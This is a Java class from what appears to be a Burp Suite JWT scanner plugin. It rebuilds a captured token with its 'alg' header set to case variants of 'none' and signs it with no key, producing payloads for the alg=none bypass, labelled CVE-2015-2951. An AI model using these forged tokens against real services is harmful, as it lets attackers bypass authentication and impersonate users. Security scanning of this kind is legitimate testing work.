package burp.core.scanner.active.jwtscanner;
import burp.IHttpRequestResponse;
import com.alibaba.fastjson.JSONObject;
import com.auth0.jwt.algorithms.Algorithm;
import java.util.ArrayList;
import java.util.List;

public class NoneLeak {

    public List<String> expList;

    public NoneLeak(IHttpRequestResponse httpRequestResponse){
        // 拼接三种常用的NONE, None, none, nOne的none签名jwt形式
        List<String> payloadList = new ArrayList<>();
        for (IJWTConstant.NoneFlag value : IJWTConstant.NoneFlag.values()) {
            MYJwt myJwt = new MYJwt(JWTUtils.verifyJwt(httpRequestResponse));
            JSONObject jsonObject = JSONObject.parseObject(myJwt.getHeaderJson());
            jsonObject.replace("alg", value);
            myJwt.setHeaderJson(jsonObject.toJSONString());
            String b64JwtHeader = myJwt.sign(Algorithm.none());
            payloadList.add(b64JwtHeader);
        }
        this.expList = payloadList;
    }

    public List<String> getExp() {
        return expList;
    }

    @Override
    public String toString() {
        return "CVE-2015-2951";
    }
}
